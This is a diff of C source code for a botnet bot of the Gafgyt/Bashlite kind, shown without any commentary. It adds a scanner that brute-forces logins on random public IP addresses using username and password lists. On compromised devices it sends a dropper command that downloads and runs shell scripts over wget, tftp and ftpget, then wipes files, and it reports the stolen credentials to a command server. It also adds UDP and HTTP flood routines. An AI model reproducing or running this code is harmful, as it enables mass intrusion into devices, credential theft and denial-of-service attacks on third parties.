+
+                                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										continue;
+
+                                    }
+									else if(readUntil(fds[i].fd, "multi-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										continue;
+
+                                    }
+									else if(readUntil(fds[i].fd, "gayfgt", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										memset(fds[i].sockbuf, 0, 1024);
+										sclose(fds[i].fd);
+										fds[i].complete = 1;
+										fds[i].state = 0;
+										continue;
+									}
+									else {
+											fds[i].bufUsed = strlen(fds[i].sockbuf);
+										 }
+
+                                    if(fds[i].totalTimeout + 10 < time(NULL))
+                                    {
+										sclose(fds[i].fd);
+										fds[i].state = 0;
+										fds[i].complete = 1;
+                                    }
+                                }
+                                break;
+                        }
+                }
+        }
 }
 
-//          ___  ___     ___ _                 _
-//  /\ /\  /   \/ _ \   / __\ | ___   ___   __| |
-// / / \ \/ /\ / /_)/  / _\ | |/ _ \ / _ \ / _` |
-// \ \_/ / /_// ___/  / /   | | (_) | (_) | (_| |
-//  \___/___,'\/      \/    |_|\___/ \___/ \__,_|
+void SSHScanner()
+{
+        int max = (getdtablesize() / 4) * 3, i, res;
+        fd_set myset;
+        struct timeval tv;
+        socklen_t lon;
+        int valopt;
+
+        max = max > 512 ? 512 : max;
+
+        struct sockaddr_in dest_addr;
+        dest_addr.sin_family = AF_INET;
+        dest_addr.sin_port = htons(22);
+        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+
+        struct telstate_t
+        {
+                int fd;
+                uint32_t ip;
+                uint8_t state;
+                uint8_t complete;
+                uint8_t usernameInd;
+                uint8_t passwordInd;
+                uint32_t totalTimeout;
+                uint16_t bufUsed;
+                char *sockbuf;
+        } fds[max];
+        memset(fds, 0, max * (sizeof(int) + 1));
+        for(i = 0; i < max; i++) { fds[i].complete = 1; fds[i].sockbuf = malloc(1024); memset(fds[i].sockbuf, 0, 1024); }
+    	struct timeval timeout;
+    	timeout.tv_sec = 5;
+    	timeout.tv_usec = 0;
+        while(1)
+        {
+                for(i = 0; i < max; i++)
+                {
+                        switch(fds[i].state)
+                        {
+                        case 0:
+                                {
+                                        memset(fds[i].sockbuf, 0, 1024);
+
+                                        if(fds[i].complete) { char *tmp = fds[i].sockbuf; memset(&(fds[i]), 0, sizeof(struct telstate_t)); fds[i].sockbuf = tmp; fds[i].ip = getRandomPublicIP(); }
+                                        else {
+                                                fds[i].passwordInd++;
+                                                if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) { fds[i].passwordInd = 0; fds[i].usernameInd++; }
+                                                if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) { fds[i].complete = 1; continue; }
+                                        }
+                                        dest_addr.sin_family = AF_INET;
+                                        dest_addr.sin_port = htons(22);
+                                        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
+                                        dest_addr.sin_addr.s_addr = fds[i].ip;
+                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
+                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
+                                        setsockopt (fds[i].fd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
+                                        if(fds[i].fd == -1) { continue; }
+                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
+                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) { /*printf("close %lu\n",fds[i].ip);*/ sclose(fds[i].fd); fds[i].complete = 1; }
+                                        else { fds[i].state = 1; fds[i].totalTimeout = 0; }
+                                }
+                                break;
+
+                        case 1:
+                                {
+                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+
+                                        FD_ZERO(&myset);
+                                        FD_SET(fds[i].fd, &myset);
+                                        tv.tv_sec = 0;
+                                        tv.tv_usec = 10000;
+                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
+                                        if(res == 1)
+                                        {
+                                                lon = sizeof(int);
+                                                valopt = 0;
+                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
+                                                if(valopt)
+                                                {
+                                                        sclose(fds[i].fd);
+                                                        fds[i].state = 0;
+                                                        fds[i].complete = 1;
+                                                } else {
+                                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
+                                                        fds[i].totalTimeout = 0;
+                                                        fds[i].bufUsed = 0;
+                                                        memset(fds[i].sockbuf, 0, 1024);
+                                                        fds[i].state = 2;
+                                                        continue;
+                                                }
+                                        } else if(res == -1)
+                                        {
+                                                sclose(fds[i].fd);
+                                                fds[i].state = 0;
+                                                fds[i].complete = 1;
+                                        }
+
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
+                                        {
+                                                sclose(fds[i].fd);
+                                                fds[i].state = 0;
+                                                fds[i].complete = 1;
+                                        }
+                                }
+                                break;
+
+                        case 2:
+                                {
+                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+
+                                        if(readUntil(fds[i].fd, "ogin:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                        {
+                                                fds[i].totalTimeout = 0;
+                                                fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+                                                else memset(fds[i].sockbuf, 0, 1024);
+                                                fds[i].state = 3;
+                                                continue;
+                                        }
+										else if(readUntil(fds[i].fd, "user:", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "name", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "pass", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										}
+										else if(readUntil(fds[i].fd, "word", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "assword:") != NULL) fds[i].state = 5;
+												else memset(fds[i].sockbuf, 0, 1024);
+												fds[i].state = 3;
+												continue;
+										} else {
+                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
+                                        }
+
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
+                                        {
+                                                sclose(fds[i].fd);
+                                                fds[i].state = 0;
+                                                fds[i].complete = 1;
+                                        }
+                                }
+                                break;
+
+                        case 3:
+                                {
+                                        if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        fds[i].state = 4;
+                                }
+                                break;
+
+                        case 4:
+                                {
+                                        if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+
+                                        if(readUntil(fds[i].fd, "pass", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                        {
+                                                fds[i].totalTimeout = 0;
+                                                fds[i].bufUsed = 0;
+                                                if(strstr(fds[i].sockbuf, "pass") != NULL) fds[i].state = 5;
+                                                else fds[i].state = 7;
+                                                memset(fds[i].sockbuf, 0, 1024);
+                                                continue;
+                                        }
+										if(readUntil(fds[i].fd, "word", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+										{
+												fds[i].totalTimeout = 0;
+												fds[i].bufUsed = 0;
+												if(strstr(fds[i].sockbuf, "word") != NULL) fds[i].state = 5;
+												else fds[i].state = 7;
+												memset(fds[i].sockbuf, 0, 1024);
+												continue;
+										}
+											else {
+                                                if(strstr(fds[i].sockbuf, "invalid") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "incorrect") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "fail") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "again") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "wrong") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "accessdenied") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "denied") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "error") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+												if(strstr(fds[i].sockbuf, "bad") != NULL) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
+                                        }
+
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
+                                        {
+                                                sclose(fds[i].fd);
+                                                fds[i].state = 0;
+                                                fds[i].complete = 1;
+                                        }
+                                }
+                                break;
+
+                        case 5:
+                                {
+                                        if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        fds[i].state = 6;
+                                }
+                                break;
+
+                        case 6:
+                                {
+                                    if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+
+                                    if(readUntil(fds[i].fd, "invalid", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+                                        fds[i].bufUsed = 0;
+                                        if(strstr(fds[i].sockbuf, "invalid") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+                                        if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                        else fds[i].state = 7;
+                                        memset(fds[i].sockbuf, 0, 1024);
+                                        continue;
+                                    }
+									if(readUntil(fds[i].fd, "incorrect", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "incorrect") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										if(!matchPrompt(fds[i].sockbuf)) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "fail", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "fail") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "again", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "again") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "wrong", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "wrong") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "accessdenied", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "accessdenied") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "denied", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "denied") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "error", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "error") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									if(readUntil(fds[i].fd, "bad", 1, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										if(strstr(fds[i].sockbuf, "bad") != NULL) { memset(fds[i].sockbuf, 0, 1024); sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 0; continue; }
+										else fds[i].state = 7;
+										memset(fds[i].sockbuf, 0, 1024);
+										continue;
+									}
+									else {
+                                                fds[i].bufUsed = strlen(fds[i].sockbuf);
+										}
+
+                                        if(fds[i].totalTimeout + 10 < time(NULL))
+                                        {
+                                                sclose(fds[i].fd);
+                                                fds[i].state = 0;
+                                                fds[i].complete = 1;
+                                        }
+                                }
+                                break;
+
+                        case 7:
+                                {
+                                    if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+                                    fds[i].state = 8;
+                                }
+                                break;
+						case 8:
+								{
+									if(send(fds[i].fd, "/bin/sh\r\n", 9, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+									fds[i].state = 9;
+								}
+								break;
+
+                        case 9:
+                                {
+                                    if(send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
+									sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+                                    fds[i].state = 10;
+                                }
+                                break;
+
+                        case 10:
+                                {
+                                    if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
+
+                                    if(readUntil(fds[i].fd, "ulti-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										continue;
+
+                                    }
+									else if(readUntil(fds[i].fd, "multi-call", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+                                    {
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										continue;
+
+                                    }
+									else if(readUntil(fds[i].fd, "gayfgt", 0, 0, 10000, fds[i].sockbuf, 1024, fds[i].bufUsed))
+									{
+										fds[i].totalTimeout = 0;
+										fds[i].bufUsed = 0;
+										send(fds[i].fd, "cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://0.0.0.0/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; tftp 0.0.0.0 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 0.0.0.0; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 0.0.0.0 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf gtop.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\r\n", 394, MSG_NOSIGNAL);
+										sockprintf(mainCommSock, "REPORT %s:%s:%s", inet_ntoa(*(struct in_addr *)&(fds[i].ip)), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
+										memset(fds[i].sockbuf, 0, 1024);
+										sclose(fds[i].fd);
+										fds[i].complete = 1;
+										fds[i].state = 0;
+										continue;
+									}
+									else {
+											fds[i].bufUsed = strlen(fds[i].sockbuf);
+										 }
+
+                                    if(fds[i].totalTimeout + 10 < time(NULL))
+                                    {
+										sclose(fds[i].fd);
+										fds[i].state = 0;
+										fds[i].complete = 1;
+                                    }
+                                }
+                                break;
+                        }
+                }
+        }
+}
+
+void sendSTD(unsigned char *ip, int port, int secs) {
+
+    int iSTD_Sock;
+
+    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);
+
+    time_t start = time(NULL);
+
+    struct sockaddr_in sin;
+
+    struct hostent *hp;
+
+    hp = gethostbyname(ip);
+
+    bzero((char*) &sin,sizeof(sin));
+    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+    sin.sin_family = hp->h_addrtype;
+    sin.sin_port = port;
+
+    unsigned int a = 0;
+
+    while(1){
+        if (a >= 50) 
+        {
+            send(iSTD_Sock, STD2_STRING, STD2_SIZE, 0);
+            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
+            if (time(NULL) >= start + secs) 
+            {
+                close(iSTD_Sock);
+				_exit(0);
+            }
+            a = 0;
+        }
+        a++;
+    }
+	
+
+}
 
 void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
 {
@@ -1118,12 +1810,6 @@ void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int pack
         }
 }
 
-//  _____  ___   ___     ___ _                 _
-// /__   \/ __\ / _ \   / __\ | ___   ___   __| |
-//   / /\/ /   / /_)/  / _\ | |/ _ \ / _ \ / _` |
-//  / / / /___/ ___/  / /   | | (_) | (_) | (_| |
-//  \/  \____/\/      \/    |_|\___/ \___/ \__,_|
-
 void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
 {
         register unsigned int pollRegister;
@@ -1232,194 +1918,50 @@ void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned
         }
 }
 
-
-//   __             __          ___ _                 _
-//   \ \  /\ /\  /\ \ \/\ /\   / __\ | ___   ___   __| |
-//    \ \/ / \ \/  \/ / //_/  / _\ | |/ _ \ / _ \ / _` |
-// /\_/ /\ \_/ / /\  / __ \  / /   | | (_) | (_) | (_| |
-// \___/  \___/\_\ \/\/  \/  \/    |_|\___/ \___/ \__,_|
-
-void sendJUNK(unsigned char *ip, int port, int end_time)
+void sendHTTP(unsigned char *url, int end_time)
 {
-
-        int max = getdtablesize() / 2, i;
-
-        struct sockaddr_in dest_addr;
-        dest_addr.sin_family = AF_INET;
-        dest_addr.sin_port = htons(port);
-        if(getHost(ip, &dest_addr.sin_addr)) return;
-        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-
-        struct state_t
-        {
-                int fd;
-                uint8_t state;
-        } fds[max];
-        memset(fds, 0, max * (sizeof(int) + 1));
-
-        fd_set myset;
-        struct timeval tv;
-        socklen_t lon;
-        int valopt, res;
-
-        unsigned char *watwat = malloc(1024);
-        memset(watwat, 0, 1024);
-
-        int end = time(NULL) + end_time;
-        while(end > time(NULL))
-        {
-                for(i = 0; i < max; i++)
-                {
-                        switch(fds[i].state)
-                        {
-                        case 0:
-                                {
-                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
-                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
-                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
-                                        else fds[i].state = 1;
-                                }
-                                break;
-
-                        case 1:
-                                {
-                                        FD_ZERO(&myset);
-                                        FD_SET(fds[i].fd, &myset);
-                                        tv.tv_sec = 0;
-                                        tv.tv_usec = 10000;
-                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
-                                        if(res == 1)
-                                        {
-                                                lon = sizeof(int);
-                                                getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
-                                                if(valopt)
-                                                {
-                                                        close(fds[i].fd);
-                                                        fds[i].state = 0;
-                                                } else {
-                                                        fds[i].state = 2;
-                                                }
-                                        } else if(res == -1)
-                                        {
-                                                close(fds[i].fd);
-                                                fds[i].state = 0;
-                                        }
-                                }
-                                break;
-
-                        case 2:
-                                {
-                                        makeRandomStr(watwat, 1024);
-                                        if(send(fds[i].fd, watwat, 1024, MSG_NOSIGNAL) == -1 && errno != EAGAIN)
-                                        {
-                                                close(fds[i].fd);
-                                                fds[i].state = 0;
-                                        }
-                                }
-                                break;
-                        }
-                }
-        }
+	int end = time(NULL) + end_time;
+	FILE *pf;
+	char *UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
+	
+	char *command[80];
+	sprintf(command,"wget -s -U \"");
+	strcat(command, UA);
+	strcat(command,"\" -q ");
+	strcat(command, url);
+	
+	while(end > time(NULL))
+	{
+		UA = useragents[rand() % (sizeof(useragents)/sizeof(char *))];
+		sprintf(command,"wget -s -U \"");
+		strcat(command, UA);
+		strcat(command,"\" -q ");
+		strcat(command, url);
+		system(command);
+	}
+	
 }
 
-//              _     _     ___ _                 _
-//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
-//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
-// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
-// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|
-
-void sendHOLD(unsigned char *ip, int port, int end_time)
+void sendCNC(unsigned char *ip,int port, int end_time)
 {
-
-        int max = getdtablesize() / 2, i;
-
-        struct sockaddr_in dest_addr;
-        dest_addr.sin_family = AF_INET;
-        dest_addr.sin_port = htons(port);
-        if(getHost(ip, &dest_addr.sin_addr)) return;
-        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-
-        struct state_t
-        {
-                int fd;
-                uint8_t state;
-        } fds[max];
-        memset(fds, 0, max * (sizeof(int) + 1));
-
-        fd_set myset;
-        struct timeval tv;
-        socklen_t lon;
-        int valopt, res;
-
-        unsigned char *watwat = malloc(1024);
-        memset(watwat, 0, 1024);
-
-        int end = time(NULL) + end_time;
-        while(end > time(NULL))
-        {
-                for(i = 0; i < max; i++)
-                {
-                        switch(fds[i].state)
-                        {
-                        case 0:
-                                {
-                                        fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
-                                        fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
-                                        if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
-                                        else fds[i].state = 1;
-                                }
-                                break;
-
-                        case 1:
-                                {
-                                        FD_ZERO(&myset);
-                                        FD_SET(fds[i].fd, &myset);
-                                        tv.tv_sec = 0;
-                                        tv.tv_usec = 10000;
-                                        res = select(fds[i].fd+1, NULL, &myset, NULL, &tv);
